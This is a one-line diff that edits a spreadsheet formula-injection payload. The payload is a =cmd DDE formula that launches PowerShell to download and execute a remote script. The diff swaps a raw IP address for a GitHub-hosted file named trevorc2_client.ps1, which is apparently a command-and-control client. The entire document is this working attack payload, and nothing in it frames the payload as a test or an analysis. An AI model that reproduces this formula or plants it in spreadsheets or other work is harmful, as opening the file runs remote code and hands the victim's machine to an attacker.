@@ -1,1 +1,1 @@
-=cmd|' /Cpowershell IEX (New-Object Net.WebClient).DownloadString(""""""http://217.182.54.237/a.ps1"""""");'!A69
+=cmd|' /Cpowershell IEX (New-Object Net.WebClient).DownloadString(""""""https://raw.githubusercontent.com/sharkush/test1/master/trevorc2_client.ps1"""""");'!A69
